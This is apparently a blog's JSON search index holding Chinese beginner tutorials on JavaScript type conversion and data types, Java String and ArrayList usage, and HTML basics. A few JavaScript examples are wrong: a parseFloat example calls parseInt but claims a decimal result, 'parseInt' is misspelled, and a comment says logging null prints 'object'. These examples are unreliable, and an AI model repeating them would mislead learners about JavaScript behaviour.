字符串----&gt;数字 转换方式一: 使用Number()函数; Number(变量) 1.如果是纯数字的字符串,则直接将其转换为数字 2.如果是字符串中有非数字的内容,则转换为NaN 3.如果字符串是一个空串或者是一个全空格的字符串,则转换为0 4.布尔类型转Number,true会转换为1,false转换为0 5.null ----&gt; 数字0 6.Undefined —&gt; 数字:NaN 转换方式二: 这种方式专门用来转换字符串 parseInt()把一个字符串转换为一个整数. parseInt()可以将一个字符串中的有效的整数内容取出来. 12var a = \"1234px\";var b = parseInt(a);//1234 parseFloat()把一个字符串转换为一个浮点数. 12var a = \"1234.111px\";var b = parseInt(a);//1234.111 如果对非String使用parseInt()或parseFloat(),他会先将其转换为String,然后在操作 12var a = true;var b = perseInt(true);//返回NaN 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; //Number() var a = \"123\"; a = Number(a); console.log(a); //123 a = true; a = Number(a); console.log(a);//1 a = NaN; a = Number(a); console.log(a);//NaN a = undefined; a = Number(a); console.log(a);//NaN a = null; a = Number(a); console.log(a);// 0 //parseInt() || parseFloat(); console.log(\"=========================\"); var a = \"123a\"; a = parseInt(a); console.log(a);//123 var a = \"123\"; a = Number(a); console.log(a);//123 a = true; a = Number(a); console.log(a);//1 a = NaN; a = Number(a); console.log(a);//NaN a = undefined; a = Number(a); console.log(a);//NaN a = null; a = Number(a); console.log(a);//0 &lt;/script&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"强制类型转换-String","slug":"JS00011强制类型转换-String","date":"2020-02-17T07:30:25.000Z","updated":"2020-02-17T07:48:42.013Z","comments":true,"path":"2020/02/17/JS00011强制类型转换-String/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/17/JS00011强制类型转换-String/","excerpt":"","text":"强制类型转换-String 强制转换类型是指将一个数据类型强制转换为其他的数据类型 类型转换主要指,将其他的数据类型,转换为 String Number Boolean 方式一: 调用被转换数据类型的toString()方法 例如 : a.toString() 该方法不会影响到原变量,他会将转换结果返回. 注意: 如果将null和Undefined这两个值用转换toString()方法就会出错 方式二 调用String()函数,并将转换的数据作为参数传递函数 例如:String(123);----String(123); 使用String();函数做强制转换时: 对于Number和Boolean实际上就是调用toString()方法 但是对于null和undefined,就不会调用toString()方法 他会将null直接转换为&quot;null&quot; 将Undefined直接转换为&quot;Undefined&quot; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; var str = 123; console.log(str.toString()); //// str = null; 出错// console.log(str.toString());// str = undefined;出错// console.log(str.toString()); str = 123.3; console.log(str.toString()); str = true; console.log(str.toString()); str = 1231; str = String(str); console.log(str); console.log(\"=================\"); str = 123.2; str = String(str); console.log(str); str = null; str = String(str); console.log(str); str = undefined; str = String(str); console.log(str); str = null; str = String(str); console.log(str); str = true; str = String(str); console.log(str); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"字符串的获取相关方法","slug":"java00056字符串的获取相关方法","date":"2020-02-16T17:44:12.000Z","updated":"2020-02-16T18:01:08.023Z","comments":true,"path":"2020/02/17/java00056字符串的获取相关方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/17/java00056字符串的获取相关方法/","excerpt":"","text":"字符串的获取相关方法 常用方法有: public int lenght(); 获取字符串长度 public String concat(String str);拼接两个字符串 public char charAt(int index);返回指定索引的字符 public int indexOf(String str);查找子字符串出现在本字符串的首字符索引值,如果没有则返回-1 1234567891011121314151617181920public class demo09&#123; public static void main(String[] args) &#123; String str = new String(\"abc\"); String str1; int len = 0; int index = 0; char ch; len = str.length();//获取字符串长度 ch = str.charAt(0);//获取str的第0个索引的字符 str1 = str.concat(\"def\");//拼接两个字符串 index = str.indexOf(\"ab\");//查找子字符串第一次出现的索引值 System.out.println(\"字符串长度:\" + len); System.out.println(\"第0个字符是:\" + ch); System.out.println(\"拼接字符:\" + str1); System.out.println(\"字符串出现的\" + index); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"字符串的比较方法","slug":"java00055字符串的比较方法","date":"2020-02-16T17:14:16.000Z","updated":"2020-02-16T17:42:58.762Z","comments":true,"path":"2020/02/17/java00055字符串的比较方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/17/java00055字符串的比较方法/","excerpt":"","text":"字符串的比较方法 想让两个字符串进行比较,就用: public boolean equals(Object obj);方法,区分大小写 public boolean equalsIgnoreCase(Object obj);不区分字母大小写 参数可以是任何对象,只有参数是一个字符串并且内容相同的才会返回一个true,否者返回false. 1.任何对象都可以用Object来接收. 2.equals方法具有对称性,也就是a.equals(b)和b.equals(a)是一样的 3.如果比较两个字符串一个是字符串常量,另一个是字符串变量,推荐把字符串常量写在前面. 推荐: &quot;zzz&quot;.equals(str); 不推荐 abc.equals(&quot;zzz&quot;); 因为如果abc是一个null又调用equals()就会抛出异常. 如果是zzz.equals(str)则会返回一个false; 12345678910111213public class demo08&#123; public static void main(String[] args) &#123; String str1 = new String(\"123\"); String str2 = new String(\"123\"); String str3 = new String(\"456\"); System.out.println(str1.equals(str2));//true System.out.println(str1.equals(str3));//false System.out.println(\"ABC\".equalsIgnoreCase(\"abc\"));//true &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"字符串的常量池","slug":"java00054字符串的常量池","date":"2020-02-16T16:51:33.000Z","updated":"2020-02-16T17:24:17.046Z","comments":true,"path":"2020/02/17/java00054字符串的常量池/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/17/java00054字符串的常量池/","excerpt":"","text":"字符串的常量池 字符串常量池:程序当中直接写上的双引号字符串,就在字符串常量池中. 对于基本类型来说, == 是用来进行数值比较的. 对于引用类型来说,== 是进行地址值的比较. String引用声明出来的字符串是不能直接修改的,修改的只是是地址值.","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"字符串的构造和直接创建","slug":"java00053字符串的构造和直接创建","date":"2020-02-15T14:01:21.000Z","updated":"2020-02-15T14:20:47.169Z","comments":true,"path":"2020/02/15/java00053字符串的构造和直接创建/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/15/java00053字符串的构造和直接创建/","excerpt":"","text":"字符串的构造和直接创建 创建字符串的常见3+1种方式. 三种构造方法: 1.创建一个空白字符串,不含有任何内容. public String(); 2.根据字符数组的内容,来创建对应的字符串. public String(char[] array); 3.根据字节数组的内容,来创建对应的字符串. public String(byte[] array); 一种直接创建: String str = &quot;abc&quot;; //右边直接用双引号 注意: 直接写上双引号,就是字符串对象了 123456789101112131415161718192021222324public class demo06&#123; public static void main(String[] args) &#123; //直接创建 String str1 = \"qqqqq\"; //创建一个空白字符串 String str2 = new String(); //根据字符数组创建 char[] charv = &#123;'w','w','w','w'&#125;; String str3 = new String(charv); //根据byte数组创建 byte[] bt = &#123;(int)'a',65,67,77,69&#125;; String str4 = new String(bt); System.out.println(str1); System.out.println(str2); System.out.println(str3); System.out.println(str4); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"字符串概述和特点","slug":"java00052字符串概述和特点","date":"2020-02-15T13:53:47.000Z","updated":"2020-02-15T14:00:14.121Z","comments":true,"path":"2020/02/15/java00052字符串概述和特点/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/15/java00052字符串概述和特点/","excerpt":"","text":"字符串概述和特点 字符串概述 java.lang.String类代表字符串 API当中说,Java程序中所有的字符串字面值(如 “abcd”) 都作为此类的实例实现. 其实就是说:程序当中所有的双引号字符串,都是String类的对象.(就算没有 nwe,也照样是.) 字符串的特点 1.字符串的内容永不可变.【重点】 2.因为字符串不可以改变，所以字符串是可以共享使用的。 3.字符串效果上相当于是char[]字符数组，但是底层原理是byte[]字节数组.","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"用ArrayList类型做函数返回类型","slug":"java00051用ArrayList类型做函数返回类型","date":"2020-02-15T13:44:45.000Z","updated":"2020-02-15T13:51:01.494Z","comments":true,"path":"2020/02/15/java00051用ArrayList类型做函数返回类型/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/15/java00051用ArrayList类型做函数返回类型/","excerpt":"","text":"用ArrayList类型做函数返回类型 格式: public static ArrayList&lt;引用类型&gt; 函数名(类型名 变量名 ) 123456789101112131415161718192021222324252627282930313233import java.util.ArrayList;import java.util.Random;/*随机存储20位数到ArrayList中,通过函数调用筛选偶数出来,并存储在一个集合中,然后返回一个只装有偶数的集合.*/public class demo05&#123; public static void main(String[] args) &#123; ArrayList&lt;Integer&gt; intList = new ArrayList&lt;&gt;(); ArrayList&lt;Integer&gt; smallList; Random r = new Random(); for (int i = 0; i &lt; 20; i++) &#123; intList.add(r.nextInt(1000)); &#125; smallList = isOuShu(intList); System.out.println(\"偶数总个数: \" + smallList.size()); System.out.println(smallList); &#125; //用 ArrayList&lt;Integer&gt;做函数返回类型 public static ArrayList&lt;Integer&gt; isOuShu(ArrayList&lt;Integer&gt; intList) &#123; ArrayList&lt;Integer&gt; smallList = new ArrayList&lt;&gt;(); for (int i = 0; i &lt; intList.size(); i++) &#123; int num = intList.get(i); if(num % 2 == 0) &#123; smallList.add(num); &#125; &#125; return smallList; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"用ArrayList类型做函数参数","slug":"java00050用ArrayList类型做函数参数","date":"2020-02-15T13:29:09.000Z","updated":"2020-02-15T13:46:00.025Z","comments":true,"path":"2020/02/15/java00050用ArrayList类型做函数参数/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/15/java00050用ArrayList类型做函数参数/","excerpt":"","text":"用ArrayList类型做函数参数 格式: public static 返回值类型 函数名(ArrayList&lt;引用类型&gt; 变量名 ) 1234567891011121314151617181920212223242526272829import java.util.ArrayList;public class demo04&#123; public static void main(String[] args) &#123; ArrayList&lt;Student&gt; std = new ArrayList&lt;&gt;(); std.add(new Student(\"张三丰\",99)); std.add(new Student(\"张无忌\",19)); std.add(new Student(\"宋远桥\",39)); std.add(new Student(\"张翠山\",44)); printArrayList(std); &#125; //用ArrayList&lt;Student&gt;做函数参数,传递过来的是一个引用的地址 public static void printArrayList(ArrayList&lt;Student&gt; std)&#123; System.out.print(\"&#123;\"); for (int i = 0; i &lt; std.size(); i++) &#123; if(i == std.size() - 1) &#123; System.out.print(std.get(i).getName() + \"&#125;\"); &#125;else&#123; System.out.print(std.get(i).getName() + \"@\"); &#125; &#125; &#125;&#125; 1234567891011121314151617181920212223242526272829public class Student&#123; private String name; private int age; public Student(String name, int age) &#123; this.name = name; this.age = age; &#125; public Student() &#123; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"ArrayList集合存储基本数据","slug":"java00049ArrayList集合存储基本数据","date":"2020-02-15T13:10:36.000Z","updated":"2020-02-15T13:25:16.632Z","comments":true,"path":"2020/02/15/java00049ArrayList集合存储基本数据/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/15/java00049ArrayList集合存储基本数据/","excerpt":"","text":"ArrayList集合存储基本数据 泛型只能是引用类型,不能是基本类型 如果希望向集合ArrayList当中存储基本类型对应的&quot;包装类&quot;。 基本类型 包装类(引用类型,包装类都位于java.lang包下) byte Byte short Short int Integer long Long float Float double Double char Character boolean Boolean 从JDK 1.5+开始,支持自动装箱和自动拆箱 自动装箱:基本类型自动转换到包装类型 自动拆箱:包装类型自动转换到基本类型 使用格式: ArrayList&lt;Integer&gt; intVal = new ArrayList&lt;&gt;(); 12345678910111213141516171819import java.util.ArrayList;import java.util.List;import java.util.Scanner;public class demo01&#123; public static void main(String[] args) &#123; //使用包装类 ArrayList&lt;Integer&gt; intList = new ArrayList&lt;&gt;(); Scanner sc = new Scanner(System.in); //向列表加入元素 intList.add(888); intList.add(89); intList.add(sc.nextInt()); //输出列表 System.out.println(intList); System.out.println(intList.get(1)); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"图片的格式","slug":"html-css00010图片的格式","date":"2020-02-15T03:21:22.000Z","updated":"2020-02-15T03:43:08.487Z","comments":true,"path":"2020/02/15/html-css00010图片的格式/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/15/html-css00010图片的格式/","excerpt":"","text":"图片的格式 常用的图片格式有三种,分别是：JPG、GIF、PNG. JPEG(JPG) JPEG图片支持的颜色比较多,图片可以压缩,但是不支持透明 一般使用JPEG来保存颜色比较丰富的图片. GIF GIF支持的颜色少,只支持简单的透明,支持动态图 图片颜色单一或者是动态图时可以使用gif PNG PNG支持的颜色多,并且支持复杂的透明 可以用来显示颜色复杂的透明的图片 图片的使用原则 效果不一致,使用效果好的. 效果一致,使用内存小的.","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"相对路径","slug":"html-css00009相对路径","date":"2020-02-15T03:05:21.000Z","updated":"2020-02-15T03:52:44.737Z","comments":true,"path":"2020/02/15/html-css00009相对路径/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/15/html-css00009相对路径/","excerpt":"","text":"相对路径 src属性配置的是图片的路径,目前我们所要使用的路径全都是相对路径. 相对路径: 相对路径指相对于当前资源所在目录的位置. 当前文件目录的文件直接写文件名 &lt;img src=&quot;1.jpg&quot; alt=&quot;哈哈哈&quot;&gt; 可以使用../来返回上一级目录. &lt;img src=&quot;../1.jpg&quot; alt=&quot;哈哈哈&quot;&gt; 返回上上级目录. &lt;img src=&quot;../../1.jpg&quot; alt=&quot;哈哈哈&quot;&gt; 返回几级目录就用几个../ 当前文件的下一级目录. &lt;img src=&quot;abc/123.jpg&quot; alt=&quot;老师&quot;&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"图片标签","slug":"html-css00008图片标签","date":"2020-02-15T02:28:07.000Z","updated":"2020-02-15T02:45:34.126Z","comments":true,"path":"2020/02/15/html-css00008图片标签/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/15/html-css00008图片标签/","excerpt":"","text":"图片标签 使用img标签来向网页中引入一个外部图片. img标签也是一个自结束标签 属性 src: 设置一个外部图片的路径 &lt;img src=&quot;图片路径&quot; /&gt; alt: &lt;img src=&quot;图片路径&quot; alt=&quot;描述信息&quot; /&gt; 1.可以用来设置在图片不能显示时,对图片的描述 2.搜索引擎可以通过alt属性来识别不同的图片. 3如果不写alt属性,则搜索引擎不会对img中的图片进行收录 width:可以用来修改图片宽度 &lt;img src=&quot;图片路径&quot; alt=&quot;描述信息&quot; width=&quot;100px&quot;/&gt; height:可以用来修改图片的高度 &lt;img src=&quot;图片路径&quot; alt=&quot;描述信息&quot; height=&quot;100px&quot; /&gt; 注意: 1.如果宽度和高度两个属性只设置一个,另一个也会同时等比例调整大小. 2.如果两个值同时指定,则按照你指定的值来设置. 3.一般开发中除了自适应的页面,不建议设置width和height.","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"实体","slug":"html-css00007实体","date":"2020-02-15T02:15:49.000Z","updated":"2020-02-15T02:26:21.630Z","comments":true,"path":"2020/02/15/html-css00007实体/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/15/html-css00007实体/","excerpt":"","text":"实体 在HTML中,一些如&lt;&gt;这种特殊字符是不能直接使用的,需要使用一些特殊的符号来表示这些特殊字符,这些特殊符号,我们称为实体(转义字符). 浏览器解析到实体时,会自动将实体转换为对应的字符. 实体语法 &amp;实体名字; &lt; 对应的实体是:&amp;lt; &gt;对应的实体是:&amp;gt; 空格实体: &amp;nbsp; 版权符号:&amp;copy; tab制表符实体: &amp;emsp; 其余的可以去查看一些官方的手册.","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"常用的标签","slug":"html-css00006常用的标签","date":"2020-02-14T13:59:23.000Z","updated":"2020-02-15T01:05:16.646Z","comments":true,"path":"2020/02/14/html-css00006常用的标签/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/html-css00006常用的标签/","excerpt":"","text":"常用的标签 标签 HTML中的标记指的就是标签. HTML使用标记标签来描述网页 结构: &lt;标签名&gt; 标签内容 &lt;/标签名&gt; &lt;标签名 /&gt; 元素: 元素和标签都是等价的,说白了元素就是标签… 但我们也可以理解成一个完整的标签称为元素. 如上面的结构所述的就是完整的标签 例如:&lt;h1&gt;我是一个完整的元素&lt;/h1&gt; 属性: 可以为HTML标签设置属性 通过属性为HTML元素提供附加信息 属性需要设置在开始标签或自结束标签中 属性总是以名称/值对的形式出现的 比如:name =&quot;value&quot; &lt;img src=&quot;&quot; alt=&quot;&quot; /&gt; 标题标签 在HTML中一共有6级标题标签 h1~h6,其中h1最大,h6最小 使用html标签时,关心的是标签的语义,我们使用的标签都是语义化标签. 6级标题中,h1的最重要,h1的重要性仅次于title,搜索引擎检索完title之后,会立即查看h1中的内容 h1标签非常重要,他会影响到页面在搜索引擎中的排名,页面只能写一个h1 一般页面中标题标签只使用h1~h3标题标签,h3以后的基本不使用 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;我是1级标签&lt;/h1&gt; &lt;h2&gt;我是2级标签&lt;/h2&gt; &lt;h3&gt;我是3级标签&lt;/h3&gt; &lt;h4&gt;我是4级标签&lt;/h4&gt; &lt;h5&gt;我是5级标签&lt;/h5&gt; &lt;h6&gt;我是6级标签&lt;/h6&gt; &lt;/body&gt;&lt;/html&gt; 段落标签 段落标签,段落标签用于表示内容中的一个自然段 使用p标签来表示一个段落 p标签中的文字,默认会独占一行,并且段与段之间会有一个间距 &lt;p&gt;我是一个段落标签,用来表示一个自然段.&lt;/p&gt; 在HTML中,字符之间写再多的空格,浏览器也会当成一个空格解析,换行也会当成一个空格解析 &lt;br&gt;换行标签 在页面中使用br标签来表示一个换行,br标签是一个自结束标签. &lt;br /&gt; &lt;hr&gt;水平标签 hr也是一个自结束标签,可以在页面中生成一条水平线. &lt;hr /&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"乱码问题","slug":"html-css00005乱码问题","date":"2020-02-14T13:08:01.000Z","updated":"2020-02-14T13:26:46.712Z","comments":true,"path":"2020/02/14/html-css00005乱码问题/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/html-css00005乱码问题/","excerpt":"","text":"乱码问题 编码: 依据一定的规则,将字符转换为二进制编码的过程称之为编码. 解码: 依据一定的规则,将二进制编码转换为字符的过程称之为解码. 字符集: 编码和解码所采用的规则,我们称之为字符集 常见字符集: 1.ASCII 2.ISO-8859-1 3.GBK 4.GB2312 中文系统默认编码 5.UTF-8 万国码,支持地球上所有的文字 乱码原因: 产生乱码的根本原因是,编码和解码所采用的字符集不同 在中文系统的浏览器中,默认都是使用GB2312进行解码的 解决: 用&lt;meta charset=&quot;字符集&quot; /&gt;标签告诉浏览器网页所采用的编码字符集 meta标签用来设置网页的一些元数据,比如网页的字符集,关键字,简介等… meta是一个自结束标签,编写一个自结束标签时,可以在开始标签中添加一个 / ANSI ANSI代表智能字符集,会跟随操作系统默认选择的字符集 例如中文操作系统默认的字符集是GB2312 12345678910&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;!--告诉浏览器,使用UTF-8进行解码 --&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"JS文档声明","slug":"html-css00004文档声明","date":"2020-02-14T12:17:28.000Z","updated":"2020-02-14T13:07:30.471Z","comments":true,"path":"2020/02/14/html-css00004文档声明/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/html-css00004文档声明/","excerpt":"","text":"JS文档声明 我们需要告诉浏览器我们编写的html是使用哪个版本的 HTML5版本的文档声明很简单,只需要在顶部添加&lt;!DOCTYPE html&gt;既可. 注意事项 如果不添加文档声明,则会导致有些浏览器会进入一个怪异模式,进入怪异模式以后,浏览器解析页面会导致页面无法正常显示,所以为了避免进入该模式,一定要写文档声明 12345678910&lt;!--我是文档声明--&gt;&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"Null和Undefined","slug":"JS00010Null和Undefined","date":"2020-02-14T01:22:09.000Z","updated":"2020-02-14T04:39:21.635Z","comments":true,"path":"2020/02/14/JS00010Null和Undefined/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/JS00010Null和Undefined/","excerpt":"","text":"Null和Undefined Null(空值)类型只有一个值,就是null null这个值专门用来表示一个为空的对象 使用typeof检查一个null值时,会返回object Undefined(未定义)类型的值只有一个,就Undefined 当声明一个变量,但未初始化时,他的值就是Undefined 使用typeof检查一个Undefined值时,也会返回一个undefined 123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script&gt; //定义一个空类型变量,和一个Undefined变量 var a = null; var b; console.log(a); // 输出object console.log(b); // 输出undefined //输出object console.log(typeof a); //输出 undefined console.log(typeof b); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[{"name":"Null和Undefined","slug":"Null和Undefined","permalink":"https://xiaowuyoucy.github.io/tags/Null和Undefined/"}]},{"title":"JS_Boolean类型","slug":"JS00009-Boolean值类型","date":"2020-02-14T01:12:57.000Z","updated":"2020-02-14T04:39:14.528Z","comments":true,"path":"2020/02/14/JS00009-Boolean值类型/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/JS00009-Boolean值类型/","excerpt":"","text":"JS_Boolean类型 Boolean布尔值 布尔值有两个,主要用来做逻辑判断 true 表示真 false 表示假 使用typeof检查一个布尔值时,会返回一个boolean 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script&gt; var isBingo = false; console.log(typeof false); console.log(typeof true); console.log(isBingo); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS_Number类型","slug":"JS00008-Number类型","date":"2020-02-14T00:29:49.000Z","updated":"2020-02-14T04:39:08.846Z","comments":true,"path":"2020/02/14/JS00008-Number类型/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/JS00008-Number类型/","excerpt":"","text":"JS_Number类型 基本概念及使用 在JS中所有的数值都是Number类型,包括整数和浮点数 可以使用一个运算符typeof来检查变量类型,使用格式typeof 变量名会返回一个变量类型的字符串 JS中可以表示的数值的最大值是:Number.MAX_VALUE JS中可以表示大于0的最小值Number.MIN_VALUE 如果使用Number类型的变量超过了Number.MAX_VALUE则会返回一个Infinity,表示正无穷. Infinity表示正无穷 -Infinity表示符无穷 使用typeof检查Infinity也会返回Number NaN是一个特殊的数字,表示Not A Number 用typeof检查NaN时也会返回number 精度: 在JS中整数的基本运算可以保证精确的. 如果使用JS进行浮点运算,可能会得到一个不精确的结果 所以不要使用JS进行对精确度要求比较高的运算 123456789101112131415161718192021222324252627282930313233343536373839&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script&gt; //声明一个整型变量和浮点型变量 var intNumber = 100; var floatNumber = 1.23; //在控制台输出两个变量的值 console.log(intNumber); console.log(floatNumber); //在控制台输出两个变量的类型 console.log(typeof intNumber); console.log(typeof floatNumber); //在控制台输出最大数值和&gt;0的最大数值 console.log(Number.MAX_VALUE); console.log(Number.MIN_VALUE); //超过最大值会返回一个Infinity var a = Number.MAX_VALUE; console.log(a * a); console.log(Number.MIN_VALUE * 1 / 2); //Infinity也是属于Number类型 console.log(typeof Infinity); //会返回一个NaN,表示不是一个数字 console.log(\"basd\" * \"abad\"); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS字符串","slug":"JS00007字符串","date":"2020-02-13T23:57:44.000Z","updated":"2020-02-14T04:39:04.728Z","comments":true,"path":"2020/02/14/JS00007字符串/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/JS00007字符串/","excerpt":"","text":"JS字符串数据 数据类型: 在JS中一共有六种数据类型 String: 字符串类型 Number: 数值类型 Boolean: 布尔类型 Null: 空值 Undefined: 未定义 Object: 对象类型 其中String,Number,Boolean,Null,Undefined属于基本数据类型 而Object属于引用数据类型. String字符串 在JS中字符串需要使用引号引起来,例如&quot;abc&quot; 使用双引号和单引号都可以,但是不能混用,例如&quot; abc ' 这样是错误的. 引号不能嵌套,双引号不能放在双引号中,单引号也不能放在单引号中 在字符串中我们可以使用\\作为转义字符. 输出两个双引号可以用两个单引号引起来:' &quot;abc&quot; ' 当表示一些特殊字符时可以使用\\进行转义,例如: \\n 表示换行符 \\t 表示一个制表符 \\\\ 表示\\ \\’ 表示’ \\&quot; 表示&quot; 12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script&gt; //声明字符串变量 var str = \"abcd\"; //使用用单引号输出双引号 var str1 = '\"1234\"'; //使用转义字符 var str2 = \"\\'qqqqqqq\\'\"; console.log(str); console.log(typeof str); console.log(str1) console.log(typeof str1); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS标识符","slug":"JS00006标识符","date":"2020-02-13T23:44:01.000Z","updated":"2020-02-14T04:38:59.770Z","comments":true,"path":"2020/02/14/JS00006标识符/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/JS00006标识符/","excerpt":"","text":"JS标识符 标识符 在JS中所有可以由我们自主命名的都可以称为是标识符. 例如:变量名,函数名,属性名等都属于标识符. 命名一个标识符时需要遵守如下规则: 1.标识符中可以含有字母,数字,下划线_,$ 2.标识符不能以数字开头. 3.标识符不能是ES中的关键字或保留字 4.标识符一般都采用小驼峰式法 -开头首字母小写,往后每个单词的首字母都是大写,其余的都是小写,例如helloWorld -JS底层保存标识符时实际上是采用Unicode的编码,也就是说标识符可以用中文,但不建议这样做.","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS字面常量和变量","slug":"JS00005字面常量和变量","date":"2020-02-13T23:32:00.000Z","updated":"2020-02-14T04:38:55.168Z","comments":true,"path":"2020/02/14/JS00005字面常量和变量/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/JS00005字面常量和变量/","excerpt":"","text":"JS字面常量和变量 字面常量: 字面常量 都是一些不能改变的值,例如1,2,3,4; 字面常量都是可以直接使用的,但是我们一般不会直接使用; 变量: 变量可以用来保存字面量,而且变量的值是可以任意改变的. 变量在JS中使用var关键字来声明一个变量; 变量声明格式:var 变量名 = 初始值; 1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script&gt; //声明一个变量 var a; //声明一个变量,并赋初始值 var age = 11; var height = 168.8; //对变量进行修改 age = 14; console.log(age); console.log(height); &lt;/script&gt; 